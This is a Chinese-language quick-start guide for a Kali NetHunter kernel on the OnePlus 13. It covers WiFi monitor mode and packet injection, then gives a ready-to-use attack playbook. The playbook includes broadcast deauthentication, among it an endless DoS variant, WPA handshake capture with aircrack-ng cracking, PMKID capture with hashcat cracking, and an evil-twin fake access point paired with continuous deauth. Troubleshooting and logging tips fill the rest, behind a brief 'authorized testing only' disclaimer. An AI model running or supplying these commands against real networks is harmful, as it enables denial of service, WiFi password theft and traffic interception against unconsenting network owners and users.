# OnePlus 13 NetHunter 快速开始指南

> 平台：SM8750 (骁龙 8 Elite), OnePlus 13
> 状态：生产就绪 · 稳定版 r8 (git `ae508b19`, 补丁集 0001-0014) · 2026-06-10

---

## 🎯 功能概览

| 功能 | 2.4GHz | 5GHz | 状态 |
|------|--------|------|------|
| Monitor Mode | ✅ | ✅ | 稳定 |
| 普通帧注入 | ✅ | ✅ | 稳定 |
| **广播 Deauth** | ✅ | ✅ | **已验证** |
| 被动监听 | ✅ | ✅ | 稳定 |
| Wext 支持 | ✅ | ✅ | 完整 |

---

## 🚀 快速启动

### 1. 启动 Monitor 模式
```bash
# 进入 NetHunter 终端
su

# 启动 monitor（信道1, 2.4GHz）
monstart 1

# 或启动 5GHz
monstart 36
```

### 2. 扫描周围 WiFi
```bash
# 使用 airodump-ng
airodump-ng wlan0mon

# 或使用自带工具
scanap
```

### 3. 广播 Deauth 攻击
```bash
# 踢掉目标 AP 的所有客户端
aireplay-ng --deauth 20 -a <目标AP_MAC> wlan0mon

# 持续攻击（DoS）
aireplay-ng --deauth 0 -a <目标AP_MAC> wlan0mon
```

### 4. 重置 Monitor（如果 AP 变少）
```bash
# 如果 airodump-ng 多次运行后 AP 越来越少
monreset 6          # 重置并锁定信道6
# 或
monreset            # 重置但不锁信道
```

### 5. 停止 Monitor
```bash
monstop
```

---

## 📋 常用攻击场景

### 快速握手捕获
```bash
# 1. 监听目标 AP
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# 2. 发送 deauth 触发重连
aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# 3. 握手包自动捕获
# 4. 破解
aircrack-ng -w wordlist.txt capture-01.cap
```

### PMKID 攻击（无需客户端）
```bash
# 直接抓取 PMKID
hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1

# 转换格式
hcxpcapngtool -o hash.hc22000 pmkid.pcapng

# 破解
hashcat -m 22000 hash.hc22000 wordlist.txt
```

### WiFi Pineapple 攻击
```bash
# 1. 创建假 AP（与目标同名）
hostapd fake_ap.conf

# 2. 持续 deauth 真实 AP
aireplay-ng --deauth 0 -a <真实AP_MAC> wlan0mon

# 3. 客户端自动连接到假 AP
```

---

## ⚠️ 注意事项

### 限制
- ❌ 单播/定向 deauth 不可用（monitor vdev 类型限制，只能发广播；非关联状态问题，r10/r11 已验证）
- ✅ 广播 deauth 踢全场（覆盖 95% 场景）；需定向单播请用外置 USB 网卡（见 §11.5 方向五）

### 兼容性
- ✅ 对大多数家用 WiFi 有效
- ⚠️ WPA3/WPA2-PMF 设备可能无效（如果对方开启 PMF）

### 合法性
- ⚠️ **仅用于授权渗透测试**
- ⚠️ **测试自己的设备**
- ⚠️ **不要攻击他人网络**

---

## 🔧 故障排查

### Monitor 模式无法启动
```bash
# 检查模块是否加载
lsmod | grep qca_cld3

# 重新加载模块
modprobe -r qca_cld3_peach_v2
modprobe qca_cld3_peach_v2
```

### airodump-ng 搜到的 AP 越来越少
```bash
# 问题：多次 ctrl+c 后 AP 数量递减，最后搜不到任何 AP
# 原因：频繁的信道切换导致驱动状态混乱

# 解决方案1（推荐）：重置 monitor vdev
monreset 6          # 重置并锁定到信道6（3秒）

# 解决方案2：完全退出再进入
monstop             # 退出 monitor（~17秒）
monstart 6          # 重新启动

# 解决方案3（最后手段）：热切模块
rmmod qca_cld3_peach_v2
modprobe qca_cld3_peach_v2
monstart 6

# 预防措施：锁定单信道，避免跳频
scanap              # 先用 STA 模式扫一遍
monstart 6          # 锁定目标信道
airodump-ng wlan0mon --channel 6   # 不跳频，只监听 ch6
```

### Deauth 无效果
```bash
# 1. 确认是广播攻击（不带 -c 参数）
aireplay-ng --deauth 20 -a <AP> wlan0mon  # ✅ 正确

# 2. 不要指定客户端
aireplay-ng --deauth 20 -a <AP> -c <CLIENT> wlan0mon  # ❌ 被拒（monitor vdev 只能广播）

# 3. 检查固件日志
dmesg | grep NETHUNTER-INJ | tail -20
# 看到 status=0 就是成功
```

### airodump 在 5G 信道"跳回 2.4G"（不是 bug）
```bash
# 现象：monstart 5745（5G ch149）后，跑 airodump-ng wlan0mon 频道变成 2.4G
# 原因：airodump 默认只跳频扫描 2.4G(CH1-14)，会覆盖你预设的 5G 频道
#       这是 airodump 的默认行为，驱动侧 set freq/iwconfig 设 5G 全部正常

# 正确用法：
airodump-ng -c 149 wlan0mon        # 锁定 5G 单信道（最常用）
airodump-ng --band a wlan0mon      # 扫描所有 5G
airodump-ng --band abg wlan0mon    # 扫描 2.4G + 5G 全部
```

### 查看详细日志
```bash
# 实时查看注入日志
dmesg -w | grep NETHUNTER-INJ

# 查看最近的日志
dmesg | grep NETHUNTER-INJ | tail -50
```

---

## 📚 完整文档

- [op13_monitor_injection_全程实战记录.md](op13_monitor_injection_全程实战记录.md) - 完整技术文档
- [DEAUTH_BREAKTHROUGH.md](DEAUTH_BREAKTHROUGH.md) - Deauth 突破详解
- [injection_limitation_summary.md](injection_limitation_summary.md) - 功能限制说明

---

## 🏆 技术成就

- 🥇 全球首个 SM8750 monitor mode
- 🥇 全球首个 SM8750 广播 deauth 注入（2.4G + 5G）
- 💎 只用 1 行代码实现广播 deauth 突破（WMI test flag）
- ✅ 稳定版 r8，补丁集 0001-0014

---

**快速开始，享受 NetHunter！** 🚀
